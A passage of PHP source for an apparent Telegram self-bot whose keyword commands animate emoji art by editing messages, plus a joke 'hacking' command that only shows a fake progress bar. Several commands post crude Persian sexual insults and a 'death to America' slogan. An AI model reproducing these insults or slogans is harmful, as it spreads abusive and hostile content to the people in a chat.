                                yield $this->messages->sendMessage(['peer' => $peer, 'message' => "● پاکسازی به طور کامل انجام شد تعداد : $del پیام حذف شدند"]);
                            } else {
                                yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ᏚᎬᏞᎰ ᎪᏙᎪᎢᎪ :|"]);
                            }
                        }
                    }
                    if ($text == 'قلب' or $text == 'ghalb') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '❤️🧡💛💚']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🧡❤️💛💚']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🧡💛❤️💚']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🧡💛💚❤️']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💛🧡💚❤️']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💛💚🧡❤️']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💛💚❤️🧡']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💚💛❤️🧡']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💚❤️💛🧡']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💚❤️🧡💛']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '❤️💚🧡💛']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '❤️🧡💚💛']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '❤️🧡💛💚']);
                    }


                    if ($text == 'مرغ') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '🥚________________🐓']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🥚_______________🐓']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🥚______________🐓']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🥚_____________🐓']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🥚____________🐓']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🥚___________🐓']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🥚__________🐓']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🥚_________🐓']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🥚________🐓']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🥚_______🐓']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🥚______🐓']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🥚____🐓']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🥚___🐓']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🥚__🐓']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🥚_🐓']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🐣🐓']);
                    }

                    if ($text == 'ابر') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '⚡️________________☁️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⚡️_______________☁️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⚡️______________☁️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⚡️_____________☁️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⚡️____________☁️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⚡️___________☁️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⚡️__________☁️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⚡️_________☁️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⚡️________☁️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⚡️_______☁️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⚡️______☁️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⚡️____☁️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⚡️___☁️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⚡️__☁️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⚡️_☁️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌩']);
                    }
                    if ($text == 'بدو') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '🏁________________🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏁_______________🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏁______________🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏁_____________🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏁____________🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏁___________🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏁__________🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏁_________🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏁________🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏁_______🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏁______🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏁____🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏁___🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏁__🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏁_🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🧍‍♂🏁']);
                    }

                    if ($text == 'عشق دو' or $text == 'love2') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '🚶‍♀________________🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶‍♀_______________🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶‍♀______________🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶‍♀_____________🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶‍♀____________🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶‍♀___________🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶‍♀__________🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶‍♀_________🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶‍♀________🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶‍♀_______🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶‍♀______🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶‍♀____🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶‍♀___🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶‍♀__🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶‍♀_🏃‍♂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💙love💙']);
                    }
                    if ($text == 'موتور' or $text == 'motor') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '🧲________________🏍']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🧲_______________🏍']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🧲______________🏍']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🧲_____________🏍']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🧲____________🏍']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🧲___________🏍']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🧲__________🏍']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🧲_________🏍']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🧲________🏍']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🧲_______🏍']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🧲______🏍']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🧲____🏍']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🧲___🏍']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🧲__🏍']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '_🧲🏍']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💥OM💥']);
                    }


                    if ($text == 'ماشین' or $text == 'car') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '💣________________🏎']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💣_______________🏎']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💣______________🏎']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💣_____________🏎']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💣____________🏎']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💣___________🏎']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💣__________🏎']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💣_________🏎']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💣________🏎']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💣_______🏎']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💣______🏎']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💣____🏎']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💣___🏎']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💣__🏎']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💣_🏎']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💥BOOM💥']);
                    }


                    if ($text == '/restart') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => '•REST SHOD-Self•']);
                        yield $this->restart();
                        die;
                    }
                    /*===============Kir😂===============*/
                    if ($text == 'kir' or $text == 'کیر') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '
😂         😂
😂       😂
😂     😂
😂   😂
😂😂
😂   😂
😂      😂
😂        😂
😂          😂
😂            😂']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '
🥺
🙄
🙄
🙄
🙄
🙄
🙄
🙄
🙄']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '
😡😡😡😡😡😡😡
😡                            😡
😡                            😡
😡😡😡😡😡😡😡
😡    😡
😡       😡
😡          😡 
😡            😡
😡              😡
😡                😡
😡        ‌          😡']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '
😂         😂 
😂       😂
😂     😂
😂   😂
😂😂 
😂   😂
😂      😂
😂        😂
😂           😂
----------------------
🥺
🙄
🙄
🙄
🙄
🙄
🙄
🙄
🙄
----------------------
😡😡😡😡😡😡😡
😡                            😡
😡                            😡
😡😡😡😡😡😡😡
😡    😡
😡       😡
😡          😡 
😡            😡
😡              😡
😡                😡
😡        ‌          😡
----------------------
عی کیر😂😂']);

                    }
                    /*===============کیر کوبص===============*/
                    if ($text == 'کیرکوبص' or $text == 'kir2') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '💩💩💩
💩💩💩
🖕🖕🖕
💥💥💥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '😂💩🖕
🖕😐🖕
 😂🖕😂
💩💩💩']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '😐💩😐
💩😂🖕
💥💩💥
🖕🖕😐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🤤🖕😐
😏🖕😏
💩💥💩
💩🖕😂']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩💩💩
🤤🤤🤤
💩👽💩
💩😐💩']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '😐🖕💩
💩💥💩
💩🖕💩
💩💔😐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩💩🖕💩
😐🖕😐🖕
💩🤤🖕🤤
🖕😐💥💩']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💥😐🖕💥
💥💩💩💥
👙👙💩💥
💩💔💩👙']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩👙💥🖕
💩💥🖕💩
👙💥🖕💥
💩😐👙🖕
💥💩💥💩']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩😐🖕💩
💩🖕💥
👙🖕رض💥
👙🖕💥
💩💥🖕
😂👙🖕
💩💥👙']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🤤😂🖕👙
😏🖕💥👙🖕🖕
😂🖕👙💥😂🖕
😂🖕👙🖕😂🖕
💔🖕🖕🖕🖕🖕
💩💩💩💩
💩👙💩👙']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🤫👙💩😂
💩🖕💩👙💥💥
💩💩💩💩💩💩
💩😐💩😐💩😐
😃💩😃😃💩💩
🤤💩🤤💩🤤💩
💩👙💩😐🖕💩']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩🖕💥👙💥
💩👙💥🖕💥👙
👙🖕💥💩💩💥
👙🖕💥💩💥😂
💩💥👙🖕💩🖕
💩👙💥🖕💥😂
💩👙💥🖕']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩👙💥👙👙
💩👙💥🖕💩😂
💩👙💥🖕💥👙
💩👙💥🖕💩👙
💩👙💥🖕😂😂
💩👙💥🖕😂😂
💩👙💥🖕']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩💩💩💩💩']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '|همش تو کص ننه بدخواه😂🖕|']);

                    }
                    /*==============معغب===============*/
                    if ($text == 'مکعب' or $text == 'mr1') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '🟥🟥🟥🟥
🟥🟥🟥🟥
🟥🟥🟥🟥
🟥🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥
🟥⬜️⬛️🟥
🟥⬛️⬜️🟥
🟥🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥
🟥⬛️⬜️🟥
🟥⬜️⬛️🟥
🟥🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥⬛️
🟥⬜️⬛️🟥
🟥⬛️⬜️🟥
⬛️🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥⬜️⬛️🟥
🟥⬛️⬜️🟥
🟥⬜️⬛️🟥
🟥⬛️⬜️🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥⬛️⬜️🟥
🟥⬜️⬛️🟥
🟥⬛️⬜️🟥
🟥⬜️⬛️🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⬜️⬛️⬜️⬛️
⬛️⬜️⬛️⬜️
⬜️⬛️⬜️⬛️
⬛️⬜️⬛️⬜️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⬛️⬜️⬛️⬜️
⬜️⬛️⬜️⬛️
⬛️⬜️⬛️⬜️
⬜️⬛️⬜️⬛️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥⬜️⬛️⬜️🟥
🟥⬛️⬜️⬛️🟥
🟥⬜️⬛️⬜️🟥
🟥⬛️⬜️⬛️🟥
🟥⬜️⬛️⬜️🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥
🟥🟨🟨🟨🟨🟨🟥
🟥🟩🟩🟩🟩🟩🟥
🟥⬛️⬛️⬛️⬛️⬛️🟥
🟥🟦🟦🟦🟦🟦🟥
🟥⬜️⬜️⬜️⬜️⬜️🟥
🟥🟥🟥🟥🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥
🟥💚💚💚💚💚🟥
🟥💙💙💙💙💙🟥
🟥❤️❤️رض❤️❤️❤️🟥
🟥💖💖💖💖💖🟥
🟥🤍🤍🤍🤍🤍🟥
🟥🟥🟥🟥🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥
🟥▫️◼️▫️◼️▫️🟥
🟥◼️▫️◼️▫️◼️🟥
🟥◽️◼️◽️◼️◽️🟥
🟥◼️◽️◼️◽️◼️🟥
🟥◽️◼️◽️◼️◽️🟥
🟥🟥🟥🟥🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥
🟥🔶🔷🔶🔷🔶🟥
🟥🔷🔶🔷🔶🔷🟥
🟥🔶🔷🔶🔷🔶🟥
🟥🔷🔶🔷🔶🔷🟥
🟥🔶🔷🔶🔷🔶🟥
🟥🟥🟥🟥🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥
🟥♥️❤️♥️❤️♥️🟥
🟥❤️♥️❤️♥️❤️🟥
🟥♥️❤️♥️❤️♥️🟥
🟥❤️♥️❤️♥️❤️🟥
🟥♥️❤️♥️❤️♥️🟥
🟥🟥🟥🟥🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💙💙💙💙']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '|☘تـــــــامــــــام☘|']);
                    }

                    if ($text == 'مربع' or $text == 'mr') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '🟥🟥🟥🟥
🟥🟥🟥🟥
🟥🟥🟥🟥
🟥🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥
🟥⬜️⬛️🟥
🟥⬛️⬜️🟥
🟥🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥
🟥⬛️⬜️🟥
🟥⬜️⬛️🟥
🟥🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥⬛️
🟥⬜️⬛️🟥
🟥⬛️⬜️🟥
⬛️🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥⬜️⬛️🟥
🟥⬛️⬜️🟥
🟥⬜️⬛️🟥
🟥⬛️⬜️🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥⬛️⬜️🟥
🟥⬜️⬛️🟥
🟥⬛️⬜️🟥
🟥⬜️⬛️🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⬜️⬛️⬜️⬛️
⬛️⬜️⬛️⬜️
⬜️⬛️⬜️⬛️
⬛️⬜️⬛️⬜️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⬛️⬜️⬛️⬜️
⬜️⬛️⬜️⬛️
⬛️⬜️⬛️⬜️
⬜️⬛️⬜️⬛️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥⬜️⬛️⬜️🟥
🟥⬛️⬜️⬛️🟥
🟥⬜️⬛️⬜️🟥
🟥⬛️⬜️⬛️🟥
🟥⬜️⬛️⬜️🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥
🟥🟨🟨🟨🟨🟨🟥
🟥🟩🟩🟩🟩🟩🟥
🟥⬛️⬛️⬛️⬛️⬛️🟥
🟥🟦🟦🟦🟦🟦🟥
🟥⬜️⬜️⬜️⬜️⬜️🟥
🟥🟥🟥🟥🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥
🟥💚💚💚💚💚🟥
🟥💙💙💙💙💙🟥
🟥❤️❤️❤️❤️❤️🟥
🟥💖💖💖💖💖🟥
🟥🤍🤍🤍🤍🤍🟥
🟥🟥🟥🟥🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥
🟥▫️◼️▫️◼️▫️🟥
🟥◼️▫️◼️▫️◼️🟥
🟥◽️◼️◽️رض◼️◽️🟥
🟥◼️◽️◼️◽️◼️🟥
🟥◽️◼️◽️◼️◽️🟥
🟥🟥🟥🟥🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥
🟥🔶🔷🔶🔷🔶🟥
🟥🔷🔶🔷🔶🔷🟥
🟥🔶🔷🔶🔷🔶🟥
🟥🔷🔶🔷🔶🔷🟥
🟥🔶🔷🔶🔷🔶🟥
🟥🟥🟥🟥🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥
🟥♥️❤️♥️❤️♥️🟥
🟥❤️♥️❤️♥️❤️🟥
🟥♥️❤️♥️❤️♥️🟥
🟥❤️♥️❤️♥️❤️🟥
🟥♥️❤️♥️❤️♥️🟥
🟥🟥🟥🟥🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💙💙💙💙']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '|تــــــــــــــــامـــــــــــــام|']);

                    }
                    if ($text == 'okkkkk' or $text == 'okkkk' or $text == 'سازنده') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "سورس کابوس :)"]);
                    }
                    if ($text == 'emam' or $text == 'مرگ بر امریکا') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '⣿⣿⣿⣿⣿⡿⠋⠁⠄⠄⠄⠈⠘⠩⢿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⠃⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠻⣿⣿⣿⣿
⣿⣿⣿⣿⠄⠄⣀⣤⣤⣤⣄⡀⠄⠄⠄⠄⠙⣿⣿⣿
⣿⣿⣿⣿⡀⢰⣿⣿⣿⣿⣿⢿⠄⠄⠄⠄⠄⠹⢿⣿
⣿⣿⣿⣿⣿⡞⠻⠿⠟⠋⠉⠁⣤⡀⠄⠄⠄⠄⠄⠄
⣿⣿⣿⣿⣿⣿⣶⢼⣷⡤⣦⣿⠛⡰⢃⠄⠐⠄⠄⢸
⣿⣿⣿⣿⣿⣿⣿⡯⢍⠿⢾⡿⣸⣿⠰⠄⢀⠄⠄⡬
⣿⣿⣿⣿⣿⣿⣿⣴⣴⣅⣾⣿⣿⡧⠦⡶⠃⠄⠠⢴
⣿⣿⣿⣿⠿⠍⣿⣿⣿⣿⣿⣿⣿⢇⠟⠁⠄⠄⠄⠄
⠟⠛⠉⠄⠄⠄⡽⣿⣿⣿⣿⣿⣯⠏⠄⠄⠄⠄⠄⠄
⠄⠄⠄⢀⣾⣾⣿⣤⣯⣿⣿⡿⠃⠄⠄⠄⠄⠄⠄ ']);
                    }
                    if ($text == 'هک کردن' or $text == 'hacking') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'تارگت مشخص شد']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'درحال اجرای اسکریپت هک کردن!']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'اسکریپت هک کردن اجرا شد ، درحال هک کردن!']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 3, 'message' => '10%']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 3, 'message' => '26%']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 3, 'message' => '47%']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 3, 'message' => '59%']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 3, 'message' => '66%']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 3, 'message' => '78%']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 3, 'message' => '83%']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 3, 'message' => '92%']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 3, 'message' => '97%']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 3, 'message' => '100%']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 3, 'message' => '💻 تارگت هک شد 📱']);
                    }
                    if ($text == 'چرخش' or $text == 'charkhesh') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '🟨🟨🟨🟨🟨
🟨🟨🟨🟨🟨
🟨▫▫▫🟨
🟨🟨🟨🟨🟨
🟨🟨🟨🟨🟨']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥
🟥🟥▫🟥🟥
🟥🟥▫🟥🟥
🟥🟥▫🟥🟥
🟥🟥🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟩🟩🟩🟩🟩
🟩▫🟩🟩🟩
🟩🟩▫🟩🟩
🟩🟩🟩▫🟩
🟩🟩🟩🟩🟩']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧
🟧▫▫▫🟧
🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧']);
